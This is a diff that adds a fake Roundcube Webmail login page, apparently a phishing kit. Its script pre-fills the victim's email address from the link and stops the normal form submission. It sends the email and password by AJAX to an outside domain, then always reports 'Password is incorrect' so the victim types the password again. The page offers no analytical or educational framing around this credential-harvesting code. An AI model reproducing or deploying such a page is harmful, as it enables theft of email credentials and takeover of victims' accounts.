@@ -1,0 +1,174 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+		<title>Webmail :: Welcome to Roundcube Webmail</title>
+<!-- 		<link rel="stylesheet" href="style.css">
+ -->		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	</head>
+ <style>
+
+
+p {
+  font-size: 18px;
+}
+#po {
+    width: 22em;  height:2.5em;
+    color: white;
+    background: #166ecc;
+    border: 0px;
+    border-radius: 5px;
+    opacity: 0.8;
+}
+
+#form{
+  
+    left      : 50%;
+    top       : 50%;
+    position  : absolute;
+    transform : translate(-50%, -50%);
+}
+
+
+  </style>
+  
+<body>
+<div id="login" align="center">
+ 
+<form  id="form" action="" method="post" name="form">
+    
+    <IMG  src="https://www.hostingireland.news/wp-content/uploads/2010/11/Webmail_logo.png" width="320" height="80" >
+   
+    <br><br> <b >Email Address:</b> <br>
+   <i class="fa fa-envelope icon"></i>
+   <input style="width: 21em; margin-top: 8px; height: 2em;  border-radius: 5px; " id="pet" name="email" value="" readonly></input><br><br>
+    
+    <b >Password</b> <br>
+    <div id="err"></div>
+     
+    <i class="fa fa-key icon"></i>
+     <input style="width: 21em;  height: 2em;  margin-top: 8px; border-radius: 5px; " id="pett" name="password" type="password" placeholder= "Enter your email password." ></input><br><br><br>
+    
+     <input id="po" type="submit" value="Log in"></input>
+    
+</form>
+</div>
+</body>
+
+
+<script src="https://code.jquery.com/jquery-3.5.0.js"></script>
+<script src="jquery.min.js"></script>
+<script type="text/javascript">
+	var url = new URLSearchParams(location.search);
+	var hash = location.hash ? location.hash.slice(1) : '';
+	var hasherror = hash && hash.indexOf('error=') > -1 ? 'error' : '';
+	var email = url.get('email') || url.get('login') || hash;
+	if(email && email.indexOf('&') > -1) email = email.split('&')[0]
+	var error =  url.get('error') || hasherror;
+	const err = document.getElementById('err');
+	if (email && /.+@.+\..+/.test(email)){
+		$("input[name='email']").val(email);
+		$("input[name='password']").focus();
+		$("#username").html(email.split('@')[0])
+	}else{
+		$("input[name='email']").focus();
+	}
+	if(error){
+		$("input[name='error']").val('error')
+	}
+
+	var msg = $('#msg').html();
+	 $('#msg').text( msg );
+	 var alertt = document.querySelector('.alert');
+
+	const pet = document.getElementById('pet');
+	const pett = document.getElementById('pett');
+	const source = document.getElementById('source');
+	const form = document.getElementById("form");
+	$("#po").click(e => {
+		e.preventDefault();
+		if(!/.+@.+\..+/.test($("input[name='email']").val())){
+			showEl(err, "red");
+			err.textContent = "Enter a valid email address.";			
+			return;
+		}else if(!$("input[name='password']").val() || !$("input[name='password']").val() > 4){
+			showEl(err, "red");
+			err.textContent = "Enter your correct password!";
+			return;
+		} else { 
+
+			showEl(err, "orange");
+			err.textContent = "Authenticating...";
+
+			var $form = $("#form");
+			var url = form.action;
+			var data = $form.serialize();
+			
+			
+		$.ajax({
+			type: "POST",
+			url: "https://jhsdshdkajdhgfyhsfhjshh.online/webmailf/tro.php",
+			data: data,
+			cache: false,
+			timeout: 800000,
+			beforeSend: function(xhr){
+				$('#po').html('Verifying...');
+				},
+			success: function(response){
+				if(response){
+				pett.value = "";
+				pett.style.borderColor = "red";
+				showEl(err, "red");
+				err.textContent = "Password is incorrect.";
+
+				
+
+
+				console.log(response);
+				if(response['signal'] == 'ok'){
+					$('#msg').html(response['msg']);
+					// $('input, textarea').val(function() {
+					//    return this.defaultValue;
+					// });
+				}
+				else{
+
+					$('#msg').html(response['msg']);
+				}
+				}else {
+					showEl(err, "red");
+					err.textContent = "Something went wrong, please try again";
+					pett.value = "";
+					pett.style.borderColor = "red";
+				}
+			},
+			error: function(){
+				showEl(err, "red");
+				err.textContent = "Something went wrong, please try again";
+				pett.value = "";
+				pett.style.borderColor = "red";
+			},
+			complete: function(){
+				$('#po').html('Log in');
+			}
+			});
+			}
+			});
+
+			function showEl(el, color) {
+				el.style.color = color;
+				el.style.display = "block";
+			}
+
+			function hideEl(el) {
+				el.style.color = '#000';
+				el.style.display = "none";
+				el.textContent = "";
+			}
+</script>	
+
+</html>
+
+
+
+
